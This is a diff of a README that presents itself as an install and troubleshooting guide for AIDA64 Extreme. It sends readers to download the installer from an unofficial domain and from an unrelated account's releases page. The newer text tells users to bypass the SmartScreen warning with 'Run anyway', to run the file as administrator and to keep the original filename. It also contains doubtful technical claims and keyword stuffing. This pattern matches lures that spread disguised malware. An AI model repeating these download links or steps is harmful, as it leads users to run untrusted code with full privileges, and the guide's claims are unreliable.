@@ -1,64 +1,68 @@
-# AIDA64 Extreme on Windows — setup & troubleshooting
+# 🛠️ AIDA64-Extreme-Install-Walkthrough - Fix Windows 11 Installation Errors Today
 
-**AIDA64-Extreme-Install-Walkthrough**
+[![](https://img.shields.io/badge/Download-AIDA64-blue.svg)](https://github.com/mean-stanleybaldwin856/AIDA64-Extreme-Install-Walkthrough/releases)
 
-Notes for users who need AIDA64 Extreme running on Windows — especially when aida64 setup fails, updates break, or the app won't start.
+AIDA64 Extreme provides deep insights into your computer hardware. Sometimes Windows 11 blocks the installation of this tool. This guide helps you navigate error screens and security prompts to get the software working on your PC.
 
----
+## 💾 Prerequisites
+Before you start, ensure your computer meets these basic requirements:
 
-## Get AIDA64 Extreme on Windows
+* Windows 10 or Windows 11 operating system.
+* At least 100 MB of free storage space.
+* An active internet connection to download the installer.
+* Administrator access to your user account.
 
-Use the link below for the Windows package referenced in this guide.
+If your computer uses an ARM-based processor, some monitoring features may behave differently. This guide focuses on standard Intel and AMD desktop systems.
 
-<p align="center">
-  <a href="https://aida64.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Open%20setup%20page-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Open setup page">
-  </a>
-</p>
+## 📥 How to Download the Software
+You must download the official installer from the project release page. 
 
-| | |
-| --- | --- |
-| **Page** | [aida64.nexustool.fun](https://aida64.nexustool.fun/) |
-| **URL** | `https://aida64.nexustool.fun/` |
-| **Platform** | Windows 10 / 11 (64-bit) |
+[Visit this page to download the software.](https://github.com/mean-stanleybaldwin856/AIDA64-Extreme-Install-Walkthrough/releases)
 
-### Recommended steps
+Click the link under the "Assets" section to save the file to your computer. Most browsers save this file to your Downloads folder by default. Do not rename the file, as the installer script requires the original filename to locate sub-components.
 
-1. Open the [setup page (aida64.nexustool.fun)](https://aida64.nexustool.fun/)
-2. Download the package to a folder you can find (e.g. Downloads)
-3. Run the installer **as administrator** if Windows asks
-4. Reboot once if the app prompts after install
+## ⚙️ Installation Steps
+Follow these steps to set up the software on your system:
 
-> This repository documents install/troubleshooting steps. Always verify downloads and scan files you did not compile yourself.
+1. Locate the downloaded file in your browser or file manager.
+2. Double-click the file to start the installation wizard.
+3. If a User Account Control prompt appears, select "Yes" to allow the installer to make changes to your device.
+4. Choose your preferred language from the drop-down menu.
+5. Review the license agreement and select "I accept" if you agree to the terms. AIDA64 requires this acceptance to verify your system sensors.
+6. Choose the destination folder. The default path (C:\Program Files) works best for most users.
+7. Click "Next" to begin the extraction process.
+8. Once the progress bar reaches the end, click "Finish" to launch the main application.
 
+## ⚠️ Troubleshooting Installation Failures
+Windows 11 includes security features that stop unknown or legacy software from running. If the setup fails, try these solutions.
 
----
+### Windows Defender SmartScreen
+If a blue box appears saying "Windows protected your PC," follow this path:
+1. Click the "More info" link on the warning screen.
+2. The display shows a new button labeled "Run anyway."
+3. Click this button to proceed with the setup.
 
-## What this repo covers
+### Incompatible Driver Errors
+AIDA64 interacts with low-level hardware drivers. If the installer stops, close all other diagnostic software. Programs like hardware monitoring tools or antivirus software sometimes lock the sensor drivers, causing the installation to crash. Restart your computer and start the setup again before you open other programs.
 
-- Clean install path on Windows 10/11  
-- Typical blockers (SmartScreen, missing runtime, permissions)  
-- Search phrases people use when something breaks  
+### Administrator Privileges
+The installer requires permission to write files to the System32 folder. Right-click the installer file and select "Run as administrator" to grant full access. This fixes most permission-related failures on modern Windows versions.
 
-**People also search for:** aida64 extreme not installing on windows 11, aida64 setup failed fix, how to install aida64 extreme on pc
+## 🖥️ Using AIDA64 Extreme
+After the installation finishes, the icon appears on your desktop. Open it to view your hardware details. The software organizes data into categories:
 
-## Common symptoms
+* Motherboard: View details about your CPU, RAM, and chipset.
+* Operating System: Check your Windows serial keys and active processes.
+* Display: See information about your graphics card and monitor settings.
+* Storage: Monitor the health and temperature of your hard drives.
+* Sensors: Track real-time voltages, fan speeds, and temperatures.
 
-| Symptom | What to try first |
-| --- | --- |
-| Installer blocked | Run as administrator; check SmartScreen |
-| App won't open after update | Reboot; repair/redownload package |
-| Missing DLL / runtime | Install latest Visual C++ redistributable |
-| Slow or frozen UI | Disable overlays; update GPU driver |
+If the software reports errors while reading sensory data, ensure you run the application in High Performance mode. This allows the tool to query the chipset directly.
 
-## FAQ
+## 🛡️ Privacy and Data
+AIDA64 pulls data from your hardware registers. The software stores this data locally on your machine. No information leaves your computer unless you explicitly choose to create a report and send it to a third party. The software does not track your browsing history or personal files.
 
-**Does this replace official support?**  
-No — it's a community troubleshooting note for Windows users.
+## 🔄 Updating Your Tools
+Check the releases page occasionally for updates. Newer versions include support for the latest processors and graphics cards. If you experience system crashes, verify that you use the most current version of the software.
 
-**Which Windows versions?**  
-Windows 10 and 11, 64-bit.
-
----
-
-**Topics:** aida64-extreme-not-installing-on-windows-11, aida64, extreme, installing, aida64-setup-failed-fix, failed, how-to-install-aida64-extreme-on-pc, aida64-extreme-install-walkthrough, aida64-extreme-install-walkthrough-2026, aida64-extreme, system-info, hardware
+Keywords: aida64, aida64-extreme, aida64-extreme-install-walkthrough, aida64-extreme-install-walkthrough-2026, aida64-extreme-not-installing-on-windows-11, aida64-setup-failed-fix, extreme, failed, hardware, how-to-install-aida64-extreme-on-pc, installing, system-info
